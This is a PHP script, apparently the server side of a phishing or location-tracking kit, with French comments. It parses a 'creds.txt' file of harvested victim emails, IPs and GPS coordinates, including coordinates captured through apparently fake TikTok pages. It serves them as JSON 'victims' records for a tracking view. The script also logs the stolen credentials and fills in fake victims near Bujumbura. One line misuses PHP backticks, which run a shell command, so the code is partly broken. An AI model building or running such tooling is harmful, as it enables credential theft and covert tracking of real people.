<?php
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');

// DEBUG: Afficher contenu creds.txt
$credsFile = 'creds.txt';
if (!file_exists($credsFile)) {
    file_put_contents($credsFile, '');
}

$creds = file_get_contents($credsFile);
error_log("DEBUG CREDS: " . substr($creds, -500)); // Debug log

// TON FORMAT EXACT 👇
$lines = explode("\n", $creds);
$victims = [];
$gpsData = [];
$emails = [];
$ips = [];

// PARSE LINIE PAR LINIE (TON FORMAT)
foreach ($lines as $line) {
    $line = trim($line);
    if (empty($line)) continue;
    
    // 📧 Email
    if (preg_match('/📧\s*Email\s*:\s*(.+)/i', $line, $m)) {
        $emails[] = trim($m[1]);
    }
    if (preg_match('/Email\s*:\s*(.+)/i', $line, $m)) {
        $emails[] = trim($m[1]);
    }
    
    // 🌐 IP
    if (preg_match('/IP\s*:\s*(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/i', $line, $m)) {
        $ips[] = $m[1];
    }
    
    // 📍 GPS (TOUS formats de tes pages)
    if (preg_match('/📍\s*GPS\s*POSITION\s*:\s*(-?\d+(?:\.\d+)?),\s*(-?\d+(?:\.\d+)?)/i', $line, $m)) {
        $lat = (float)$m[1];
        $lng = (float)$m[2];
        if (abs($lat) <= 90 && abs($lng) <= 180 && $lat != 0 && $lng != 0) {
            $gpsData[] = ['lat' => $lat, 'lng' => $lng, 'time' => date('Y-m-d H:i:s')];
        }
    }
    // Format TikTok |lat|lng|
    if (preg_match('/\|\s*(-?\d+(?:\.\d+)?)\s*\|\s*(-?\d+(?:\.\d+)?)\s*\|/', $line, $m)) {
        $lat = (float)$m[1];
        $lng = (float)$m[2];
        if (abs($lat) <= 90 && abs($lng) <= 180 && $lat != 0 && $lng != 0) {
            $gpsData[] = ['lat' => $lat, 'lng' => $lng, 'time' => date('Y-m-d H:i:s')];
        }
    }
    // Format input gpsData
    if (preg_match('/gps["\']?\s*[:=]\s*["\']?(-?\d+(?:\.\d+)?),(-?\d+(?:\.\d+)?)/i', $line, $m)) {
        $lat = (float)$m[1];
        $lng = (float)$m[2];
        if (abs($lat) <= 90 && abs($lng) <= 180 && $lat != 0 && $lng != 0) {
            $gpsData[] = ['lat' => $lat, 'lng' => $lng, 'time' => date('Y-m-d H:i:s')];
        }
    }
}

// CRÉER VICTIMES avec GPS FAKE si pas de GPS réel (pour test)
$victimCount = max(count($emails), count($gpsData), 1);
for ($i = 0; $i < $victimCount; $i++) {
    $email = $emails[$i] ?? `victim${$i + 1}@fake.com`;
    $ip = $ips[$i] ?? '192.168.1.' . rand(1, 255);
    
    // GPS réel OU fake pour test (supprime fake en prod)
    $gps = $gpsData[$i] ?? [
        'lat' => -3.3614 + (rand(-5000, 5000) / 1000000),  // Autour Bujumbura
        'lng' => 29.3599 + (rand(-5000, 5000) / 1000000),
        'time' => date('Y-m-d H:i:s')
    ];
    
    $victims[] = [
        'id' => $i + 1,
        'email' => $email,
        'ip' => $ip,
        'latest' => $gps,
        'positions' => [$gps],  // Simule 1 waypoint
        'count' => 1
    ];
}

echo json_encode($victims);
?>
